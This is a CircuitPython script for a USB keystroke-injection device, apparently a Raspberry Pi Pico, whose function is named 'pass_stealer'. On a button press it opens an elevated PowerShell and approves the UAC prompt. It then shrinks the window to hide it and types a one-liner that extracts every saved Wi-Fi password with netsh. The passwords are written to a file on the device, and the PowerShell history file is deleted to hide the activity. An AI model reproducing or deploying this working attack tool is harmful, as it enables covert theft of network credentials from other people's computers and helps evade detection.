import board
import digitalio
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from time import sleep


button = digitalio.DigitalInOut(board.GP1)
button.direction = digitalio.Direction.INPUT
button.pull = digitalio.Pull.UP
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

previous_state = True
process_executed = False
#-----------------------------
# --Constant--
# You Should Run As Administrator
SMALL_SHELL_WINDOW = r' mode con:cols=12 lines=1'

# --Functions--
def open_power_shell(run_as_admin=False,command=''):
    sleep(0.5)
    key.send(Keycode.GUI,Keycode.R)
    sleep(0.5)
    if run_as_admin:
        kbd.write('powershell ')
        key.send(Keycode.CONTROL,Keycode.SHIFT,Keycode.ENTER)
        sleep(1)
        key.send(Keycode.LEFT_ARROW,Keycode.ENTER)
    else:
        kbd.write('powershell  \n')

def pass_stealer(command=''):
    if command !='':
        kbd.write(command)
        key.send(Keycode.ENTER)
    sleep(0.5)
    script = r'''param($l="CIRCUITPY",$f="P.txt"); (Get-Volume -FileSystemLabel $l).DriveLetter | % { $d=$_; netsh wlan show profiles | ? { $_ -match ":\s(.+)$" } | % { $n=$matches[1].Trim(); $p=(netsh wlan show profile name=$n key=clear | sls "Key Content\s*:\s(.+)$").Matches.Groups[1].Value.Trim(); "WiFi: $n | Password: $p" | Out-File "${d}:\$f" -Encoding UTF8 -Append }; sleep 2 ;Remove-Item (Get-PSReadLineOption).HistorySavePath;sleep 1;exit  }'''
    kbd.write(script)
    sleep(1)
    key.send(Keycode.ENTER)
    
    


# --Config--   
key = Keyboard(usb_hid.devices)
kbd = KeyboardLayoutUS(key)

#-----------------------------
def run_process():
    # start : LED is on
    led.value = True
    sleep(1)
    open_power_shell(run_as_admin=True)
    sleep(1)
    pass_stealer(command=SMALL_SHELL_WINDOW)
    # finish : LED is off
    led.value = False  

    

while True:
    current_state = button.value
    
    if current_state != previous_state:
        if not current_state:  
            if not process_executed:
                run_process()
                process_executed = True
        else:  
            process_executed = False
    
    previous_state = current_state
    time.sleep(0.05) 

